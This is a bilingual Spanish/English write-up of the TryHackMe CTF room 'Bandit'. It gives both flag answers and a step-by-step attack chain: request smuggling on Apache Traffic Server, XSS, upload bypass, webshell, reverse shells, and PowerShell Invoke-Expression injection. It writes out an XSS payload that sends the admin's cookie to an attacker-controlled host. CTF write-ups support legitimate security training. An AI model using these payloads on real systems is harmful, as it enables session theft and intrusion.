# Bandit [HARD]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** HARD
* **Tipo / Type:** CTF (Premium)
* **Slug:** `bandit`
* **Link:** https://tryhackme.com/room/bandit
* **Sección / Section:** 03 Level Hard
* **Fuente / Source:** thmrevenant (GitHub)

## Solucionario de Tareas / Task Solutions

> **ES:** La sala Bandit cubre HTTP Request Smuggling (Apache Traffic Server), bypass de subida de archivos y inyección de PowerShell. Se registra un túnel SSH, se roba la sesión del administrador que monitorea el sitio mediante smuggling + XSS, se sube un webshell PHP diminuto, y tras pivote se escapa del entorno restringido de PowerShell.
> **EN:** The Bandit room covers HTTP Request Smuggling (Apache Traffic Server), file upload bypasses, and PowerShell injection. You register an SSH tunnel, steal the session of the admin monitoring the site via smuggling + XSS, upload a tiny PHP webshell, and finally escape the restricted PowerShell environment.

### Task 1 — Bandera de usuario / User flag

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the user flag? | `THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}` |

### Task 2 — Bandera de root / Root flag

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the root flag? | `THM{FULL_PRIVILEGES_HERE_THE_ESCAPE_IS_DONE}` |

## Metodología / Methodology

1. **Paso / Step:** Registrarse por SSH a `register@<Target primeros 3 octetos>.250` con la contraseña `register`; se obtiene el hostname `bandit.escape`.
2. **Paso / Step:** Escaneo Nmap completo: puertos `22` (OpenSSH Ubuntu), `80` (Apache Traffic Server 7.1.1), `631` (CUPS 2.4) y `8002` (Apache Hadoop).
3. **Paso / Step:** En `bandit.escape` la caja de búsqueda refleja entrada; el filtrado de XSS se evade cerrando el atributo con `"` y un `>`: `"><script>alert('1');</script>`; cada usuario recibe una cookie `PHPSESSID` y la página es "monitoreada".
4. **Paso / Step:** HTTP Request Smuggling en Apache Traffic Server 7.1.1 (CL.TE); se envía de forma rápida una petición que "cuela" el XSS a la sesión del administrador que vigila el sitio.
5. **Paso / Step:** Payload de robo de cookie `a"><script>document.write('<img src="http://<IP>:8002/test.gif?cookie=' + document.cookie + '" />');</script>` (URL-encoded); tras ~1 minuto cae el `PHPSESSID` del admin en el listener.
6. **Paso / Step:** Gobuster revela `upload.php` (redirige a `login.php`) y el directorio `uploads/`; con la sesión robada se accede al área de subida.
7. **Paso / Step:** File Upload Bypass: un archivo PHP con extensión `.png` se acepta (se guarda con el MD5 del nombre); cambiando la extensión a `.php` también funciona (Burp Repeater); hay límite de caracteres, así que se usa el shell PHP más pequeño posible.
8. **Paso / Step:** Reverse shell con `nc` y enumeración del contenedor (`.dockerenv`); en el directorio anterior aparece `auth.php` con credenciales válidas para SSH.
9. **Paso / Step:** SSH como usuario `ubuntu` (miembro de `sudo`) → acceso root; el directorio `.local` de `ubuntu` contiene PowerShell (`pwsh`) y credenciales para una `PSSession`.
10. **Paso / Step:** `/etc/hosts` resuelve al target Windows (`banditcorp`); se establece la `PSSession` y se descubre un entorno de PowerShell restringido.
11. **Paso / Step:** Inyección de PowerShell: `Get-ServicesApplication` usa `Invoke-Expression`, por lo que `-Filter '$(<comando>)'` permite ejecutar código; se descarga `nc.exe` y se lanza una reverse shell → escape completo → flags de user y root.

### Cadena de ataque / Attack Chain

```
SSH register (.250) -> nmap -> Apache Traffic Server CL.TE Smuggling -> XSS -> robar PHPSESSID -> upload.php -> webshell PHP diminuto -> reverse shell -> auth.php creds -> SSH ubuntu (sudo) -> pwsh PSSession -> PowerShell restringido -> Invoke-Expression injection -> nc.exe reverse shell -> user flag -> root flag
```

**Lección:** El "escape" real no es de Docker: el camino es HTTP Request Smuggling para robar una sesión, bypass de subida de archivos y evasión de un entorno PowerShell restringido mediante inyección en `Invoke-Expression`.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.